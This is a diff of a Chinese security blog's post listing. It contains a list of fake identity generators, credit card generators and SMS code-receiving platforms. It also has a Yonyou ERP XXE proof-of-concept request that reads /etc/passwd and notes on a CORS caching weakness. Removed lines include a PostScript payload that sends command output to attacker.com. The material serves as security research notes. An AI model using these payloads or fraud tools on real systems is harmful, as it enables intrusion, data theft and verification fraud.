+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-04-11T15:40:30+08:00">
+                2020-04-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/黑产/" itemprop="url" rel="index">
+                    <span itemprop="name">黑产</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>1、美国身份生成器<br><a href="http://www.haoweichi.com/" target="_blank" rel="noopener">http://www.haoweichi.com/</a></p>
+<p>2、判断美国号码是实体号还是虚拟号的网站<br><a href="https://freecarrierlookup.com/" target="_blank" rel="noopener">https://freecarrierlookup.com/</a></p>
+<p>3、信用卡生成<br><a href="http://www.e4dai.com/tool/CreditCard.asp" target="_blank" rel="noopener">http://www.e4dai.com/tool/CreditCard.asp</a></p>
+<p>4、在线接收验证码网站<br>SMSReceiveFree：<a href="https://smsreceivefree.com" target="_blank" rel="noopener">https://smsreceivefree.com</a><br>Receive SMS Online for FREE：<a href="https://www.receive-sms-online.info" target="_blank" rel="noopener">https://www.receive-sms-online.info</a><br>Receive a SMS Online：<a href="https://receive-a-sms.com" target="_blank" rel="noopener">https://receive-a-sms.com</a><br>Free SMS Numbers Online：<a href="https://smsnumbersonline.com" target="_blank" rel="noopener">https://smsnumbersonline.com</a><br>Receive SMS online for Free：<a href="https://sms-online.co/receive-free-sms" target="_blank" rel="noopener">https://sms-online.co/receive-free-sms</a><br>Receive-SMS：<a href="https://receive-sms.com" target="_blank" rel="noopener">https://receive-sms.com</a><br>Receive FREE SMS online：<a href="http://receivefreesms.com" target="_blank" rel="noopener">http://receivefreesms.com</a><br>RECEIVE SMS ONLINE：<a href="https://www.receivesmsonline.net" target="_blank" rel="noopener">https://www.receivesmsonline.net</a><br>Free Online Phone：<a href="https://www.freeonlinephone.org" target="_blank" rel="noopener">https://www.freeonlinephone.org</a><br>Receive SMS Online：<a href="http://receive-sms-online.com" target="_blank" rel="noopener">http://receive-sms-online.com</a><br>TextNow：<a href="https://www.textnow.com" target="_blank" rel="noopener">https://www.textnow.com</a><br>Textfree：<a href="https://www.pinger.com/text-free" target="_blank" rel="noopener">https://www.pinger.com/text-free</a><br>SELLAITE：<a href="http://sms.sellaite.com" target="_blank" rel="noopener">http://sms.sellaite.com</a><br>Twilio：<a href="https://www.twilio.com" target="_blank" rel="noopener">https://www.twilio.com</a><br>国内接码(z-sms)：<a href="http://www.z-sms.com" target="_blank" rel="noopener">http://www.z-sms.com</a><br>国内接码：<a href="https://www.pdflibr.com" target="_blank" rel="noopener">https://www.pdflibr.com</a></p>
+<p>5、2020年4月安卓上可用打码<br>具体使用方法可以参考本站里面的  神话接码  教程,  下面给大家整理一些2020年可用的安卓,  PC端短信接码平台如下:</p>
+<ol>
+<li>爱码:  <a href="http://www.aimajiema.com" target="_blank" rel="noopener">http://www.aimajiema.com</a>  </li>
+<li>路虎:  <a href="http://www.luhujiema.com" target="_blank" rel="noopener">http://www.luhujiema.com</a>  </li>
+<li>飞享:  <a href="http://feixiang.taixingwds.com/" target="_blank" rel="noopener">http://feixiang.taixingwds.com/</a>  </li>
+<li>神妈:  <a href="http://202.79.167.29/" target="_blank" rel="noopener">http://202.79.167.29/</a>  </li>
+<li>蓝狐:  <a href="http://xiangjiuer.cn/" target="_blank" rel="noopener">http://xiangjiuer.cn/</a>  </li>
+<li>番茄:  <a href="http://ifanqie.cc/" target="_blank" rel="noopener">http://ifanqie.cc/</a>  </li>
+<li>米粒:  <a href="http://www.yyyung.cn:9000/index.html" target="_blank" rel="noopener">http://www.yyyung.cn:9000/index.html</a>  </li>
+<li>乌龟:  <a href="http://wuguima.cn/" target="_blank" rel="noopener">http://wuguima.cn/</a>  </li>
+<li>新妈:  <a href="http://www.xinma1.com:10001/home.html" target="_blank" rel="noopener">http://www.xinma1.com:10001/home.html</a>  </li>
+</ol>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/25/用友ERP的XXE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="JOJO">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="少女的泪">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/03/25/用友ERP的XXE/" itemprop="url">用友ERP的XXE</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-03-25T18:27:36+08:00">
+                2020-03-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/poc/" itemprop="url" rel="index">
+                    <span itemprop="name">poc</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">用友的老洞了 XXE（playload见附件）</span><br><span class="line">POST /uapws/soapFormat.ajax HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0</span><br><span class="line">Accept: text/html,application/xhtml+x</span><br><span class="line">ml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">X-Requested-With: xmlHttpRequest</span><br><span class="line">Content-Length: 563</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID=04471ECB344BF351BCD35FB2E823A913.ncMem02; SaveStateCookie=Server%2Cnc.uap.oba.word.webservice.IServiceEntryPoint%3AIServiceEntryPointPortType%2Cnc.uap.oba.update.IUpdateService%2Cnc.uap.oba.update.IUpdateService%3AIUpdateServicePortType%2Cnc.uap.oba.wordWebservice.IServiceEntry%2Cnc.uap.oba.wordWebservice.IServiceEntry%3AIServiceEntryPortType%2Cnc.itf.msgcenter.IMsgCenterWebService%2Cnc.itf.msgcenter.IMsgCenterWebService%3AIMsgCenterWebServicePortType%2Ctbb%2Cnc.itf.tb.outlineversion.TbbOutlineUpateVersionService%2Cnc.itf.tb.outlineversion.TbbOutlineUpateVersionService%3ATbbOutlineUpateVersionServicePortType%2Cuapmp%2Cuapbs%2Cnc.itf.tb.oba.IOBAMasterNodeWebService%2Cnc.itf.tb.oba.INtbOBAWebService%2Cnc.itf.tb.oba.IOBAMasterNodeWebService%3AIOBAMasterNodeWebServicePortType%2Cnc.itf.tb.oba.INtbOBAWebService%3AINtbOBAWebServicePortType%2Criaam%2Cnc.pubitf.rbac.IUserPubServiceWS%2Cnc.pubitf.rbac.IUserPubServiceWS%3AIUserPubServiceWSPortType%2Cbqrtofr%2Cnc.uap.oba.ws.IObaReportService%2Cnc.uap.oba.ws.IObaReportService%3AIObaReportServicePortType%2Cnc.itf.bap.oba.IObaExcelService%2Cnc.itf.bap.oba.IObaExcelService%3AIObaExcelServicePortType%2Caeam%2Cnc.itf.bap.service.IBapIOService%2Cnc.itf.bap.service.IBapIOService%3AIBapIOServicePortType%2Cnc.uap.oba.word.webservice.IServiceEntryPoint%2Caedsm%2Cuap.pubitf.ae.meta.ImetaWebService4BqCloud%2Cuap.pubitf.ae.meta.ImetaWebService4BqCloud%3AImetaWebService4BqCloudPortType%2Cuap.pubitf.ae.meta.ImetaWebService%2Cuap.pubitf.ae.meta.ImetaWebService%3AImetaWebServicePortType; JSESSIONID=03FAE0AA99984716E2B0BF9BE46A1040.ncMem02</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msg=<span class="meta">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span> <span class="attr">xmlns:soap</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Fault</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">faultcode</span>&gt;</span>soap:Server%26xxe%3B<span class="tag">&lt;/<span class="name">faultcode</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">faultstring</span>&gt;</span>java.lang.RuntimeException: can not find datasource: ?<span class="tag">&lt;/<span class="name">faultstring</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Fault</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/06/关于CORS的一些记录/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -390,11 +1476,15 @@
 <ol>
 <li>当<code>Access-Control-Allow-Origin:*</code>时，credentials不能设置为true，设置为true可能会报错？（不确定），可以设置为false，设置为false不报错，不设置默认应该也是false，即允许任何域时不允许ajax请求传递敏感头部</li>
 <li>当<code>Access-Control-Allow-Origin: 某域名</code>时，credentials设置true则是常见的配置漏洞，设置为false时浏览器如果发起ajax时设置withcredentials为true则报错</li>
-<li>当不设置时默认为null，即拒绝除本域以外所有的域名<h2 id="0x02-想法"><a href="#0x02-想法" class="headerlink" title="0x02 想法"></a>0x02 想法</h2>如果文中所说的属实，那么这个漏洞存在应该很久了，而且利用条件很低，目测只要有敏感接口并且设置了<code>Access-Control-Allow-Origin:*</code>，那么这个接口就变成了一个在Chrome浏览器下接近于csrf漏洞。<br>比较一下这个漏洞和jsonp、csrf的差别：<h3 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h3>得存在callback的jsonp接口，存在这种接口，并且会根据cookies返回敏感信息，因为script标签会传递cookies所以就变成了csrf，防范手段也和csrf类似，但接口必须是支持jsonp格式的json接口<h3 id="一般csrf"><a href="#一般csrf" class="headerlink" title="一般csrf"></a>一般csrf</h3>一般的csrf通常是构造html表单并自动提交，通常是触发特定动作而不能获取到数据<h3 id="这个缓存漏洞"><a href="#这个缓存漏洞" class="headerlink" title="这个缓存漏洞"></a>这个缓存漏洞</h3>一般的通过js去拉取数据需要cors配置为<code>Access-Control-Allow-Origin: 某域名</code>且credentials设置true，利用该第三方域名可控来获取敏感数据，但如果配合Chrome缓存问题，可以把这个origin扩大到任意域名，但有个潜在的条件是需要用户先访问目标接口后缓存了页面数据，才可以读取该接口的返回数据。换句话说利用条件：</li>
+<li>当不设置时默认为null，即拒绝除本域以外所有的域名<h2 id="0x02-与csrf相比"><a href="#0x02-与csrf相比" class="headerlink" title="0x02 与csrf相比"></a>0x02 与csrf相比</h2>如果文中所说的属实，那么这个漏洞存在应该很久了，而且利用条件很低，目测只要有敏感接口并且设置了<code>Access-Control-Allow-Origin:*</code>，那么这个接口就变成了一个在Chrome浏览器下接近于csrf漏洞。<br>比较一下这个漏洞和jsonp、csrf的差别：<h3 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h3>得存在callback的jsonp接口，存在这种接口，并且会根据cookies返回敏感信息，因为script标签会传递cookies所以就变成了csrf，防范手段也和csrf类似，但接口必须是支持jsonp格式的json接口<h3 id="一般csrf"><a href="#一般csrf" class="headerlink" title="一般csrf"></a>一般csrf</h3>一般的csrf通常是构造html表单并自动提交，通常是触发特定动作而不能获取到数据<h3 id="这个缓存漏洞"><a href="#这个缓存漏洞" class="headerlink" title="这个缓存漏洞"></a>这个缓存漏洞</h3>一般的通过js去拉取数据需要cors配置为<code>Access-Control-Allow-Origin: 某域名</code>且credentials设置true，利用该第三方域名可控来获取敏感数据，但如果配合Chrome缓存问题，可以把这个origin扩大到任意域名，但有个潜在的条件是需要用户先访问目标接口后缓存了页面数据，才可以读取该接口的返回数据。换句话说利用条件：</li>
 <li>没有csrf防御</li>
 <li>存在敏感信息或有利用价值的东西</li>
 <li>origin为星号</li>
 <li>用户在这之前用Chrome浏览器访问过该接口</li>
+<li>默认浏览器都会存在缓存，除非设置为cache-control为max-age=0或者是no-store<h2 id="0x03-关于缓存"><a href="#0x03-关于缓存" class="headerlink" title="0x03 关于缓存"></a>0x03 关于缓存</h2></li>
+<li>Cache-control头部会设置强缓存相关配置</li>
+<li>在没有设置cache-control头部时，因为Response Header 存在 Date、Last-Modified浏览器使用LM factor 算法在没有 Cache-Control 以及 Expires 的时候，用来计算应该强制缓存多长时间所以状态码返回还是200 不是 304，如果什么缓存策略都没设置，浏览器会采用一个启发式的算法，通常会取响应头中的 Date 减去 Last-Modified 值的 10% 作为缓存时间。</li>
+<li>命中缓存应该只需要url一致即可</li>
 </ol>
 
           
@@ -606,7 +1696,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/17/Untitled/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/17/vue的学习（上）/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="JOJO">
@@ -625,7 +1715,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/10/17/Untitled/" itemprop="url">Untitled</a></h1>
+                <a class="post-title-link" href="/2019/10/17/vue的学习（上）/" itemprop="url">vue的学习（上）</a></h1>
         
 
         <div class="post-meta">
@@ -648,125 +1738,6 @@
           </span>
 
           
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/09/热门CVE记录（一）/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="JOJO">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/touxiang.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="少女的泪">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/10/09/热门CVE记录（一）/" itemprop="url">热门CVE记录（一）</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-09T17:40:30+08:00">
-                2019-10-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
             <span class="post-category">
             
               <span class="post-meta-divider">|</span>
@@ -779,8 +1750,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CVE记录/" itemprop="url" rel="index">
-                    <span itemprop="name">CVE记录</span>
+                  <a href="/categories/javascript/" itemprop="url" rel="index">
+                    <span itemprop="name">javascript</span>
                   </a>
                 </span>
 
@@ -818,957 +1789,43 @@
       
         
           
-            <h2 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h2><h3 id="Dlink"><a href="#Dlink" class="headerlink" title="Dlink"></a>Dlink</h3><p>CVE-2019-16920 | 20191005 | <a href="https://www.fortinet.com/blog/threat-research/d-link-routers-found-vulnerable-rce.html" target="_blank" rel="noopener"> CVE-2019-16920 poc</a></p>
-<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><h3 id="xstream"><a href="#xstream" class="headerlink" title="xstream"></a>xstream</h3><p>CVE-2019-10173 | 20190720 | 反序列化</p>
-<h2 id="jira"><a href="#jira" class="headerlink" title="jira"></a>jira</h2><p>CVE-2019-14994 | 20190919 | url path traversal | <a href="https://zh-cn.tenable.com/blog/cve-2019-14994-url-path-traversal-vulnerability-in-jira-service-desk-leads-to-information" target="_blank" rel="noopener">/..;/</a><br>CVE-2019–11581｜20190601｜rce  | 印象笔记<br>CVE-2019-8451 | 20190925 | ssrf | <a href="https://lh5.googleusercontent.com/I3TRyJO61dcd_0VPMpTfER-9fMjPb4-aj1lJHej6eo9-b1jqjI-FMbeX44PJlWOs_Pv3VkPS3Fi-wYEutpukOUpBRqllY6SMxjKaJnRxIEunP3VzOZR1vewHJvPsgdHWDujHRbuD" target="_blank" rel="noopener">ssrf png</a></p>
-<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><h3 id="joomla3-4-6rce-｜-20191008｜exp"><a href="#joomla3-4-6rce-｜-20191008｜exp" class="headerlink" title="joomla3.4.6rce ｜ 20191008｜exp"></a>joomla3.4.6rce ｜ 20191008｜<a href="https://www.exploit-db.com/exploits/47465" target="_blank" rel="noopener">exp</a></h3><h3 id="php-RCE-CVE-2019-11043-20191024-攻击工具"><a href="#php-RCE-CVE-2019-11043-20191024-攻击工具" class="headerlink" title="php RCE CVE-2019-11043  | 20191024 | 攻击工具"></a>php RCE CVE-2019-11043  | 20191024 | <a href="https://github.com/neex/phuip-fpizdam" target="_blank" rel="noopener">攻击工具</a></h3><h2 id="Nhttpd"><a href="#Nhttpd" class="headerlink" title="Nhttpd"></a>Nhttpd</h2><p>CVE-2019-16278 ｜ 20191015 ｜ url path traversal ice <a href="https://git.sp0re.sh/sp0re/Nhttpd-exploits/src/branch/master/CVE-2019-16278.sh" target="_blank" rel="noopener">CVE-2019-16278</a></p>
-<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>Image / Video converters : Image magick : CVE-2016–3718(fill ‘url(<a href="http://attacker.com/)&#39;" target="_blank" rel="noopener">http://attacker.com/)&#39;</a>) CVE-2016–3718 / FFMPEG : CVE-2017–9993 (gen_xbin_playlist(playlist_location))</p>
-<h2 id="postscript"><a href="#postscript" class="headerlink" title="postscript"></a>postscript</h2><p>CVE-2016-3714<br>CVE-2018-16509<br>CVE-2019-6116<br>CVE-2016-7976 RCE on PDF upload:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">currentdevice null true mark /OutputICCProfile (%pipe%curl attacker.com/?a=$(whoami|base64) )</span><br><span class="line">.putdeviceparams</span><br><span class="line">quit</span><br></pre></td></tr></table></figure></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/10/scapy发送TLS自定义包/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="JOJO">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/touxiang.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="少女的泪">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/09/10/scapy发送TLS自定义包/" itemprop="url">scapy发送TLS自定义包</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-10T12:21:30+08:00">
-                2019-09-10
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/网络安全/" itemprop="url" rel="index">
-                    <span itemprop="name">网络安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="00-安装配置scapy"><a href="#00-安装配置scapy" class="headerlink" title="00 安装配置scapy"></a>00 安装配置scapy</h2><p>直接从github上下载scapy源码，然后进入到目录中运行即可。<br>由于TLS并不是默认开启的layer，所以需要在配置项中的layer里加入tls。<br>运行后输入TLS查看是否报错，如果没有报错说明TLS层的启用正常。</p>
-<h2 id="01-构造TLS请求"><a href="#01-构造TLS请求" class="headerlink" title="01 构造TLS请求"></a>01 构造TLS请求</h2><p>经过一系列的研究尝试，得出如下构造hello包的代码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sn = ServerName(servername="<span class="tag">&lt;<span class="name">put</span> <span class="attr">server</span> <span class="attr">name</span> <span class="attr">here</span>&gt;</span>\x00\x00\x00\0")</span><br><span class="line">ext = [TLS_Ext_SupportedGroups(groups=["secp256r1"]),</span><br><span class="line">               TLS_Ext_ServerName(servernames=[sn]),</span><br><span class="line">               TLS_Ext_KeyShare_CH(client_shares=[KeyShareEntry(group=23)]),  # noqa: E501</span><br><span class="line">             #  TLS_Ext_SupportedVersions(versions=["TLS 1.3-d18"]),</span><br><span class="line">               TLS_Ext_SignatureAlgorithms(sig_algs=["sha256+rsapss",</span><br><span class="line">                                                     "sha256+rsa"])]</span><br><span class="line">p = TLSClientHello(ciphers=0x1301, ext=ext)</span><br><span class="line">TLSClientAutomaton(server="mail.xxxx.com",dport=995,client_hello=p).run()</span><br></pre></td></tr></table></figure></p>
-<p>Servername那个参数可以替换成任意的服务器名即可达到我们的目的</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/29/修改tpot蜜罐为主控+探测器模式/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="JOJO">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/touxiang.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="少女的泪">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/08/29/修改tpot蜜罐为主控+探测器模式/" itemprop="url">修改tpot蜜罐为主控+探测器模式</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-29T12:31:30+08:00">
-                2019-08-29
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/蜜罐/" itemprop="url" rel="index">
-                    <span itemprop="name">蜜罐</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-关于tpot相关"><a href="#0x00-关于tpot相关" class="headerlink" title="0x00 关于tpot相关"></a>0x00 关于tpot相关</h2><p>Tpot我个人理解是一个比较不错的高集成度的蜜罐系统，里面有很多的蜜罐使用docker封装起来独立运行。tpot则将每一个独立的蜜罐的日志格式整理起来最终通过ELK的形式统一展示，效果非常不错，下面是控制端的图：<br><img src="https://image.3001.net/images/20190913/1568364483_5d7b57c3e4aae.jpg!small" alt><br>这界面，这特效，没什么好说的就是棒，就是赛博朋克！<br>另外dashboard的模板不止一个，所以很不错，搜索那边日志也分割的很清晰，可以搜集到很多有用的信息。<br>如果我们不需要主控和探测分离，也就是所有的东西都装在一台机器上的话，可以不用看后面的内容，只需要找个可以上传自定义镜像的vps，然后安装标准版然后打开即可用，没有什么好说的。<br>现在我们希望实现的是如下模式：<br>  ————-> sensor1<br>controller |<br> —————>sensor2<br>即部署主从模式的蜜罐，仅仅在外网部署N个探测器，然后将日志信息全部集中到一台主控端上进行分析处理。我翻了一下tpot，貌似没有天生将主控和探测器分离安装，因此要实现这种形式需要手工进行分离ELK。<br>既然整个tpot日志分析都基于ELK，那么我们要做的也很简单，将elasticsearch和kibana分离出来作为主控端，每个sensor上部署logstash，logstash的日志发送地址全部发送到主控的elasticsearch就好了。<br>补一个tpot的地址：<a href="http://dtag-dev-sec.github.io/mediator/feature/2019/04/01/tpot-1903.html" title="tpot官网" target="_blank" rel="noopener">tpot官网</a></p>
